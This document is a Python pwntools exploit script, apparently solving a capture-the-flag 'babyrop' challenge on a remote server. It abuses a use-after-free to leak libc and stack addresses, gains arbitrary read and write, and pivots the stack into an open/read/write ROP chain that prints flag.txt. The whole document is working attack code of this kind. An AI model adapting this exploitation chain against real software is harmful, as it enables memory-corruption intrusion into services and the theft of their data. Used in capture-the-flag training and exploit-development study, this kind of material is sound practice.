from pwn import *
context.arch = 'amd64'

elf = ELF('./babyrop')
libc = ELF('./libc.so.6')

# p = elf.process(env = {'LD_PRELOAD': './libc.so.6'})
p = remote('mc.ax', 31245)

def create(idx, len, cont):
    p.recvuntil(b'command: ')
    p.sendline(b'C\n' + str(idx).encode() + b'\n' + str(len).encode())
    p.recvuntil(b'string: ')
    p.send(cont)

def free(idx):
    p.recvuntil(b'command: ')
    p.sendline(b'F\n' + str(idx).encode())
    p.recvuntil(b'index: ')

def read(idx):
    p.recvuntil(b'command: ')
    p.sendline(b'R\n' + str(idx).encode())
    p.recvuntil(b'index: ')

def write(idx, cont):
    p.sendline(b'W\n' + str(idx).encode())
    p.recvuntil(b'string: ')
    p.send(cont)

def exit():
    p.recvuntil(b'command: ')
    p.send(b'E')
    p.sendline(b'1')

def parse_hex():
    p.recvuntil(b'hex-encoded bytes\n')
    ls = p.recvline()[:-1].split(b' ')[1:]
    lb = []
    for i in range(len(ls) // 8):
        x = int(ls[i * 8 + 7], 16)
        for o in range(6, -1, -1):
            x <<= 8
            x += int(ls[i * 8 + o], 16)
        lb.append(x)
    return lb

create(0, 0x10, b'a')
for i in range(1, 9):
    create(i, 0x80, b'a')

for i in range(8, 1, -1):
    free(i)

free(0)
free(1)

for i in range(2, 7):
    create(i, 0x10, p64(0x8))

read(1)
lh = parse_hex()
libc_leak = lh[0] - 0x30

def ch_ptr(ptr, len):
    write(6, p64(len)+ p64(ptr))

libc_base = libc_leak - 0x1f4c90
libc.address = libc_base

environ_off = 0x1fcec0
ch_ptr(libc_base + environ_off, 0x8)
read(0)
lh = parse_hex()
stack_leak = lh[0]
ret_addr = stack_leak - 0x140

buf = 0x404100
buf2 = 0x404300
flag_addr = 0x404500
flag_buf = 0x404600

leave_ret = 0x00000000004012da
pop_rdi = 0x000000000002d7dd + libc_base
pop_rsi = 0x000000000002eef9 + libc_base
pop_rdx = 0x00000000000d9c2d + libc_base
pop_rcx = 0x0000000000110f8b + libc_base
rop = flat([buf2, pop_rdi, flag_addr, pop_rsi, 0, pop_rdx, 0, libc.symbols['open'], pop_rdi, 3, pop_rsi, flag_buf, pop_rdx, 0x100, libc.symbols['read'], pop_rdi, 1, pop_rsi, flag_buf, pop_rdx, 0x100, libc.symbols['write']])

ch_ptr(flag_addr, 0x30)
write(0, b'./flag.txt')

ch_ptr(buf, len(rop))
write(0, rop)

ch_ptr(ret_addr - 0x8, 0x10)
write(0, p64(buf) + p64(leave_ret))
exit()

p.interactive()

# main_arena = __malloc_hook - 0x7500